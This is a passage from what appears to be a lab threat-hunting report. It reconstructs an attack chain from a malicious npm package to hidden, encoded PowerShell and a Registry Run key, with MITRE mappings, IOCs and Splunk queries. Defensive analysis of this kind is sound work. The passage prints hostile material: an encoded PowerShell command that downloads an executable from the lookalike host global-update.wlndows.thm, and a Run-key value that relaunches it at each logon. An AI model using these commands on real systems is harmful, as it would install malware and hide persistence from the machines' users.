Asset:</strong> paw-tom (Process: powershell.exe; Network: DNS query, potential outbound connection attempt; File System: creation of temporary script file, intended creation of SystemHealthUpdater.exe)</li></ul><ul id="22c5b2cc-075b-80f0-9711-d6228ae8f01f" class="bulleted-list"><li style="list-style-type:disc"><strong>IOCs (Specific to this Phase):</strong><ul id="22c5b2cc-075b-8018-b1ef-fca58fd1fe9b" class="bulleted-list"><li style="list-style-type:circle">Image (powershell.exe process): C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (ParentProcessGuid matching the cmd.exe from Phase 1)</li></ul><ul id="22c5b2cc-075b-80da-acc7-d8a4bab8ac7a" class="bulleted-list"><li style="list-style-type:circle">CommandLine (of powershell.exe): powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABTAHkAcwB0AGUAbQBIAGUAYQBsAHQAaABVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAJAB1AHIAbAAgAD0AIAIiAGgAdAB0AHAAOgAvAC8AZwBsAG8AYgBhAGwALQB1AHAAZABhAHQAZQAuAHcAbABuAGQAbwB3AHMALgB0AGgAbQAvAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoAFUAcABkAGEAdABlAHIALgBlAHgAZQAiAA0ACgANAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGYAaQBsAGUADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AA0ACgANAAoAIwAgAEIAYQBzAGUANgA0ACAAZQBuAGMAb2RlACAAIHRoAGUAIABjAG8AbQBtAGEAbgBkAA0ACgAkAGUAbgBjAG8AZABlAGQAIABQACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQANAAoAIAAgACAAIAAwAFMAdAByAGkAbgBnACgADQAKACAAIAAgACAAWwBUAGUAeAB0AC4ARQBuAGMAb2RpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQA... (From Event 43451)</li></ul><ul id="22c5b2cc-075b-80bb-b9e2-f944ec219d67" class="bulleted-list"><li style="list-style-type:circle">$url variable in decoded script: http://global-update.wlndows.thm/SystemHealthUpdater.exe</li></ul><ul id="22c5b2cc-075b-80b8-aeaf-d1249bf4c694" class="bulleted-list"><li style="list-style-type:circle">Hostname Contacted: global-update.wlndows.thm (From DNS query Event 22)</li></ul><ul id="22c5b2cc-075b-801a-9c00-d50ff43bf788" class="bulleted-list"><li style="list-style-type:circle">QueryName: global-update.wlndows.thm (Event 22)</li></ul><ul id="22c5b2cc-075b-803a-b2fe-ce3d3d00b493" class="bulleted-list"><li style="list-style-type:circle">QueryResults: ::ffff:127.0.0.1 (Event 22 - Key indicator download likely failed)</li></ul><ul id="22c5b2cc-075b-8068-97ed-cdca3c154166" class="bulleted-list"><li style="list-style-type:circle">Downloaded File Path: %APPDATA%\SystemHealthUpdater.exe (or C:\Users\&lt;User&gt;\AppData\Roaming\SystemHealthUpdater.exe) (From decoded script)</li></ul><ul id="22c5b2cc-075b-80de-a111-e0027ff30ba2" class="bulleted-list"><li style="list-style-type:circle">TargetFilename (Temporary PowerShell Script): *\\AppData\\*\\Temp\\*__PSScriptPolicyTest_*.ps1 (Event 11)</li></ul><ul id="22c5b2cc-075b-80c9-8a77-f7b600cd6539" class="bulleted-list"><li style="list-style-type:circle">PowerShell Command Pattern: Invoke-WebRequest -Uri *global-update.wlndows.thm* -OutFile *SystemHealthUpdater.exe* (From decoded script logic)</li></ul></li></ul><ul id="22c5b2cc-075b-8069-94c1-e83adb776263" class="bulleted-list"><li style="list-style-type:disc"><strong>Splunk Hunting Steps:</strong> (These remain the same as in the previous detailed plan, linking them to the PowerShell ProcessGuid identified in Phase 1)<ol type="1" id="22c5b2cc-075b-80f1-9a8f-d7e932d490ba" class="numbered-list" start="1"><li><strong>Identify PowerShell Spawning from cmd.exe with Encoded Command:</strong> Use EventCode=1 filtering for powershell.exe as the Image and matching the ParentProcessGuid to the cmd.exe processes found in Phase 1 Step 3.</li></ol><ol type="1" id="22c5b2cc-075b-8013-bb94-d631e860ff3c" class="numbered-list" start="2"><li><strong>Identify Temporary PowerShell Script Creation:</strong> Use EventCode=11 filtering for the temporary script pattern and linking to the ProcessGuid of the malicious PowerShell process from Step 1 of this phase.</li></ol><ol type="1" id="22c5b2cc-075b-80a6-a3e8-c3f3b83280a4" class="numbered-list" start="3"><li><strong>Search for DNS queries to the malicious domain:</strong> Use EventCode=22 for the specific QueryName=&quot;global-update.wlndows.thm&quot;. Link to the malicious PowerShell ProcessGuid.</li></ol><ol type="1" id="22c5b2cc-075b-8030-b0f0-cf0431b65ed9" class="numbered-list" start="4"><li><strong>Search for Network Connections:</strong> (If applicable) Use EventCode=3 or network logs, linked to the malicious PowerShell ProcessGuid.</li></ol><ol type="1" id="22c5b2cc-075b-805c-994f-ef9d043995df" class="numbered-list" start="5"><li><strong>Search for File Creation at Download Path:</strong> Use EventCode=11 targeting the *\\AppData\\*\\SystemHealthUpdater.exe path, linked to the malicious PowerShell ProcessGuid.</li></ol></li></ul><hr id="22c5b2cc-075b-80c5-83b7-ee0ec84a4eb7"/><p id="22c5b2cc-075b-805d-9709-d6271baf489e" class=""><strong>Phase 3: Establishing Persistence</strong></p><ul id="22c5b2cc-075b-800a-b010-cca040e27799" class="bulleted-list"><li style="list-style-type:disc"><strong>Title:</strong> Registry Run Key Persistence Installation</li></ul><ul id="22c5b2cc-075b-8066-b2be-f9205b685edb" class="bulleted-list"><li style="list-style-type:disc"><strong>Adversary Step Description:</strong> The PowerShell process from Phase 2 proceeds to modify the user&#x27;s registry hive. It adds a new value named &quot;Windows Update Monitor&quot; to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run key. The data of this registry value is another Base64 encoded PowerShell command (powershell.exe -NoP -W Hidden -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAVQBzAGUyc...). This command, when decoded, is Start-Process &#x27;C:\Users\Administrator\AppData\AppData\Roaming\SystemHealthUpdater.exe&#x27;. This ensures that the intended malware file path will be executed hiddenly via PowerShell every time the user logs onto the system.</li></ul><ul id="22c5b2cc-075b-8054-8d38-e5a3fc4febb9" class="bulleted-list"><li style="list-style-type:disc"><strong>Timestamp (Observed):</strong> 21/06/2025 10:58:29.000 AM (Event 43454)</li></ul><ul id="22c5b2cc-075b-8025-a816-e6c89d895a9a" class="bulleted-list"><li style="list-style-type:disc"><strong>MITRE ATT&amp;CK:</strong><ul id="22c5b2cc-075b-809c-b533-f64d8b6c3cd1" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Persistence (TA0003)<ul id="22c5b2cc-075b-8003-b576-f22d0f047990" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Boot or Logon Autostart Execution (T1547) - Registry Run Keys / Startup Folders (T1547.001).</li></ul></li></ul><ul id="22c5b2cc-075b-80e5-b701-f8dfa67a3915" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Execution (TA0002)<ul id="22c5b2cc-075b-8013-9d45-c43900bebe54" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Command and Scripting Interpreter (T1059) - PowerShell (T1059.001) (The command stored in the registry).</li></ul></li></ul><ul id="22c5b2cc-075b-8028-963c-c96df3a0de5e" class="bulleted-list"><li style="list-style-type:circle"><strong>Tactic:</strong> Defense Evasion (TA0005)<ul id="22c5b2cc-075b-8004-a1ba-f06b3d97f15c" class="bulleted-list"><li style="list-style-type:square"><strong>Technique:</strong> Obfuscated Files or Information (T1027) - Encoded Content (T1027.003) (The registry value command is encoded).</li></ul></li></ul></li></ul><ul id="22c5b2cc-075b-8007-bca6-ce2e884a257e" class="bulleted-list"><li style="list-style-type:disc"><strong>Affected User:</strong> PAW-TOM\itadmin-tom (Specifically their registry hive)</li></ul><ul id="22c5b2cc-075b-80b3-b3d7-ca0868fd0108" class="bulleted-list"><li style="list-style-type:disc"><strong>Affected Asset:</strong> paw-tom (Process: powershell.exe; Registry: modified user hive)</li></ul><ul id="22c5b2cc-075b-8047-974a-f08e58f12c74" class="bulleted-list"><li style="list-style-type:disc"><strong>IOCs (Specific to this Phase):</strong><ul id="22c5b2cc-075b-8035-b264-e9c03efd2f3f" class="bulleted-list"><li style="list-style-type:circle">Registry Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run (General path)</li></ul><ul id="22c5b2cc-075b-803e-b921-e76f47befe67" class="bulleted-list"><li style="list-style-type:circle">Registry Value Name: Windows Update Monitor</li></ul><ul id="22c5b2cc-075b-80a2-ad89-e99e253fb0ce" class="bulleted-list"><li style="list-style-type:circle">TargetObject (Sysmon EID 13): HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor (Specific path including user SID)</li></ul><ul id="22c5b2cc-075b-8004-9d8d-dc7a2ddf1e4f" class="bulleted-list"><li style="list-style-type:circle">Registry Value Data: powershell.exe -NoP -W Hidden -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAVQBzAGUyc... (Full value from Event 43454)</li></ul><ul id="22c5b2cc-075b-8040-8503-de325def479c" class="bulleted-list"><li style="list-style-type:circle">Decoded command from registry value: Start-Process &#x27;C:\Users\Administrator\AppData\Roaming\SystemHealthUpdater.exe&#x27;</li></ul></li></ul><ul id="22c5b2cc-075b-809c-9860-eb7c0d94bbd8" class="bulleted-list"><li style="list-style-type:disc"><strong>Splunk Hunting Steps:</strong> (This remains the same as in the previous detailed plan, linking to the PowerShell ProcessGuid identified in Phase 1)<ol type="1" id="22c5b2cc-075b-80e4-8e2e-f628613eb6d1" class="numbered-list" start="1"><li><strong>Search for registry modifications to the Run key:</strong> Use EventCode=13 targeting the TargetObject pattern for the Run key and value name &quot;Windows Update Monitor&quot;. Link to the malicious PowerShell ProcessGuid from Phase 1 Step 4.</li></ol></li></ul><hr id="22c5b2cc-075b-806a-b9c3-c4d7718a735c"/><p id="22c5b2cc-075b-8073-8760-d230b9da5445" class=""><strong>Determining Scope (Consolidated Step):</strong></p><p id="22c5b2cc-075b-807d-8e83-cf0ca08d4ed6" class="">The approach for determining scope remains the same: use the key IOCs from all three phases in broadened Splunk queries (removing specific host/user/ProcessGuid filters) to find all instances across your environment.</p><ul id="22c5b2cc-075b-8063-92bc-c4b490de61db" class="bulleted-list"><li style="list-style-type:disc"><strong>Key IOCs for Broadened Search:</strong><ul id="22c5b2cc-075b-806b-82f9-fbed81b515e5" class="bulleted-list"><li style="list-style-type:circle">CommandLine=&quot;*npm-cli.js* install healthchk-lib@1.0.1*&quot; (for node.exe images)</li></ul><ul id="22c5b2cc-075b-80a2-864b-cac0c713a9df" class="bulleted-list"><li style="list-style-type:circle">TargetFilename=&quot;*\\node_modules\\healthchk-lib\\scripts\\postinstall.ps1&quot; (for node.exe images)</li></ul><ul id="22c5b2cc-075b-8061-aafb-f6ccbd822375" class="bulleted-list"><li style="list-style-type:circle">ParentImage=&quot;*\\nodejs\\node.exe&quot; AND Image=&quot;*\\cmd.exe&quot; AND ParentCommandLine=&quot;*npm-cli.js* install healthchk-lib@1.0.1*&quot;</li></ul><ul id="22c5b2cc-075b-80dc-a935-ce67298648b9" class="bulleted-list"><li style="list-style-type:circle">ParentImage=&quot;*\\cmd.exe&quot; AND Image=&quot;*\\powershell.exe&quot; AND CommandLine=&quot;*-NoP -W Hidden -EncodedCommand JABkAGUAcwB0*&quot; (Look for the beginning of the specific encoded command)</li></ul><ul id="22c5b2cc-075b-8079-a8cf-d967225fdb7f" class="bulleted-list"><li style="list-style-type:circle">QueryName=&quot;global-update.wlndows.thm&quot; (Event 22)</li></ul><ul id="22c5b2cc-075b-8015-976d-f0855cefcce0" class="bulleted-list"><li style="list-style-type:circle">TargetObject=&quot;*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update Monitor&quot; (Event 13)</li></ul><ul id="22c5b2cc-075b-807c-ad3c-c18ed24174d4" class="bulleted-list"><li style="list-style-type:circle">TargetFilename=&quot;*\\AppData\\*\\SystemHealthUpdater.exe&quot; (Event 11 - check for the downloaded file)</li></ul><ul id="22c5b2cc-075b-80f8-a713-d08befedd2b2" class="bulleted-list"><li style="list-style-type:circle">TargetFilename=&quot;*\\AppData\\*\\Temp\\*__PSScriptPolicyTest_*.ps1&quot; (Event 11 - check for temporary scripts)</li></ul></li></ul><p id="22c5b2cc-075b-8069-b2e9-f173c3880a86" class="">For each broadened query, use | stats count by ComputerName, User to build your list of affected entities.</p><hr id="22c5b2cc-075b-8050-b785-ef9e2a3a6df0"/><p id="22c5b2cc-075b-803a-8d4f-d0dd59369d6f" class="">By following these refined steps, you can precisely trace the attack from the installation of the malicious package to the attempt to retrieve a payload and the successful establishment of persistence, providing a clear and accurate reconstruction for your threat hunting report.</p><p id="22c5b2cc-075b-8075-acae-fbdd22ba9f52" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
